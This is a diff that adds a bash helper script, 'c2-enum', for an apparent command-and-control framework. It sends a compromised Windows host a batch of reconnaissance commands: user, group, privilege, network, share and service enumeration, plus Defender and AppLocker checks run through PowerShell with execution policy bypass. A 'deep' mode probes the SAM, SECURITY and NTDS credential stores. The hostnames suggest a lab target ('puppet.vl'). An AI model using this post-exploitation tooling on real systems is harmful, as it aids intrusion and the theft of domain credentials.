@@ -1,0 +1,62 @@
+#!/bin/bash
+# c2-enum - Gather comprehensive system info from the target
+# Usage: c2-enum [beacon_id] [--deep]
+C2="$(dirname "$0")/c2"
+BEACON=""
+DEEP=false
+
+for arg in "$@"; do
+    case "$arg" in
+        --deep) DEEP=true ;;
+        *)      BEACON="$arg" ;;
+    esac
+done
+
+if [ -n "$BEACON" ]; then
+    $C2 use "$BEACON" >/dev/null 2>&1
+fi
+
+echo "=== TARGET ENUMERATION ==="
+echo "[*] Starting enumeration..."
+
+$C2 task "whoami"
+$C2 task "whoami /priv"
+$C2 task "whoami /groups"
+$C2 task "systeminfo"
+$C2 task "hostname"
+$C2 task "ipconfig /all"
+$C2 task "netstat -ano"
+$C2 task "tasklist /v"
+$C2 task "net user"
+$C2 task "net localgroup"
+$C2 task "net localgroup Administrators"
+$C2 task "net share"
+$C2 task "net view /domain"
+$C2 task "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint"
+$C2 task "sc query state= all"
+$C2 task "schtasks /query /fo LIST /v"
+$C2 task "dir C:\\Users\\"
+$C2 task "dir C:\\ProgramData\\"
+$C2 task "dir C:\\temp\\ 2>nul || echo no temp dir"
+
+# Security checks
+$C2 task "powershell -NoP -Ep Bypass -Command \"Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled,AMServiceEnabled\""
+$C2 task "powershell -NoP -Ep Bypass -Command \"Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections\""
+$C2 task "powershell -NoP -Ep Bypass -Command \"Get-PSDrive | Where-Object {$_.Used -gt 0} | Select-Object Name,Used,Free\""
+
+if [ "$DEEP" = true ]; then
+    echo "[*] Deep mode: extra recon..."
+    $C2 task "reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS"
+    $C2 task "reg query HKLM\\SAM\\SAM 2>nul || echo SAM access denied"
+    $C2 task "reg query HKLM\\SECURITY\\SECURITY 2>nul || echo SECURITY access denied"
+    $C2 task "dir C:\\Windows\\NTDS\\ 2>nul || echo NTDS dir not accessible"
+    $C2 task "cacls C:\\Windows\\System32\\config"
+    $C2 task "arp -a"
+    $C2 task "route print"
+    $C2 task "nslookup dc01.puppet.vl 2>nul"
+    $C2 task "nslookup file01.puppet.vl 2>nul"
+    $C2 task "dir C:\\inetpub\\ 2>nul || echo no inetpub"
+    $C2 task "dir C:\\xampp\\ 2>nul || echo no xampp"
+fi
+
+echo "[*] All commands tasked. Wait 120s, then check output."
